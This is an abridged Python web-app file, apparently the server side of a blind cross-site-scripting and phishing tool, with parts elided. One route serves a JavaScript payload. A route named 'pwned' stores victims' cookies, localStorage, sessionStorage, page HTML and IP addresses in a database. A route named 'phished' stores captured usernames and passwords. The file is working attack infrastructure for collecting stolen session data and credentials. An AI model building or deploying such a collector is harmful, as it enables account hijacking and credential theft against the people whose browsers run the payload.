# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-vaya-ciego-nen\app.py
import os
...
def home():
    with open("payload.js", "r") as f:
        payload = f.read()
    payload += (
        'letsgo("' + config.DOMAIN + '", "' + request.query_string.decode() + '");'
    )
...
def pwned():
    ...
    with get_cursor(commit=True) as cur:
        cur.execute(
            "INSERT INTO triggers (cookies,url,localStorage,sessionStorage,html,canvas,useragent,IP,time,extra) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)",
            (
                data["cookies"],
                data["url"],
                data["localStorage"],
...
def phished():
    ...
    with get_cursor(commit=True) as cur:
        cur.execute(
            "INSERT INTO triggers (url,IP,time,username,password) VALUES (%s, %s, %s, %s, %s)",
            (data["url"], data["IP"], data["time"], data["user"], data["pass"]),
        )
    return "ok"
